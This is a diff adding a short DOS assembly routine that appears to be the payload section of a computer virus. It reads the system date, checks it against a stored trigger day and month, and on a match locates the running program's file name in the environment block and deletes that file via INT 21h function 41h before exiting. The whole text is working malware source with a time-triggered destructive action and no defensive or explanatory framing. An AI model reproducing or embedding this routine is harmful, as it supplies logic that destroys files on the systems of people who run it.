@@ -1,0 +1,56 @@
+;---------------------------------
+action:                            ; 
+MOV AH,2AH                         ;        
+INT 21H                            ;get date           
+CMP Dl,byte ptr cs:[action_dia+bp] ;is equal to my day?                 
+JE  cont                           ;nop! fuck ret          
+cmp byte ptr cs:[action_dia+bp],32 ;
+jne no_day                         ;
+cont:                              ; 
+cmp dh,byte ptr cs:[action_mes+bp] ;is equal to my month?            
+je set                             ;
+cmp byte ptr cs:[action_mes+bp],13 ;
+jne NO_DAY                         ;nop! fuck ret           
+set:                               ; 
+                                  ; 
+mov ds,word ptr cs:[2ch]          ;      
+xor bx,bx                         ;   
+nuevo:                            ;     
+inc bx                            ;get file name! 
+mov dl,byte ptr ds:[bx]           ;
+cmp dl,00                         ;   
+jne nuevo                         ;   
+nuevo1:                           ;       
+inc bx                            ; 
+mov dl,byte ptr ds:[bx]           ;get file name!    
+cmp dl,00                         ;     
+jne nuevo1                        ;     
+nuevo2:                           ; 
+inc bx                            ;     
+mov dl,byte ptr ds:[bx]           ;get file name!           
+cmp dl,01                         ;  
+jne nuevo2                        ; 
+nuevo3:                           ;           
+inc bx                            ; 
+mov dl,byte ptr ds:[bx]           ;get file name!     
+cmp dl,00                         ;        
+jne nuevo3                        ;                  
+cero3:                            ; 
+inc bx                            ; 
+push bx                           ;                      
+pop dx                            ;
+push dx                           ;
+push ds                           ; 
+push cs                           ;
+pop ds                            ;
+push cs                           ;
+pop es                            ;
+pop ds                            ;
+pop dx                            ;
+MOV AH,41H                        ;delete name 
+iNT 21H                           ;ds:dx=file mame 
+int 20h                           ;
+NO_DAY:                           ;             
+ret                               ;
+;---------------------------------
+
